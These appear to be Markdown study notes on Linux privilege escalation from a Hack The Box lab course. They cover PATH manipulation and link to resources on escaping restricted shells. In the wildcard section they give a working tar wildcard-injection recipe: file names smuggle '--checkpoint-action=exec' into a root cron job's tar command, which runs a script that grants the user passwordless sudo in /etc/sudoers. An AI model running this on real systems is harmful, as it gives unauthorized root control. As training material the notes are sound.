-  [Path Abuse](#path-abuse)
-  [Wildcard Abuse](#wildcard-abuse)
-  [Escaping Restricted Shells](#escaping-restricted-shells)
---
### Path Abuse
- [PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located.
	- Creating a script or program in a directory specified in the PATH will make it executable
	- Adding `.` to a user's PATH adds the current directory to the list.
		``` bash
		$ echo $PATH
		/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
		$ PATH=.:${PATH}  
		$ export PATH  
		```
### Wildcard Abuse
- [Linux-PrivEsc-Wildcard](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)
- [wildcards-spare-tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
- If we have a cron job that runs every minute with sudo privilege.
	``` txt
	mh dom mon dow command  
	*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
	```
	- We can leverage the wild card in the cron job to write out the necessary commands as **file names**.
		``` bash
		# Create shell script to append code to /etc/sudoers that will make you a sudoer.
		$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
		
		# Create a filenames that will be processed as tar command args
		# checkpoint flag, allows you to execute actions after specified number of files archived.
		$ echo "" > --checkpoint=1
		$ echo "" > "--checkpoint-action=exec=sh root.sh"
		
		$ ls -la
		-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
		-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
		-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
		-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
		```
### Escaping Restricted Shells
- [Escaping from Jails](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash)
- [Escape restricted shells](https://0xffsec.com/handbook/shells/restricted-shells/)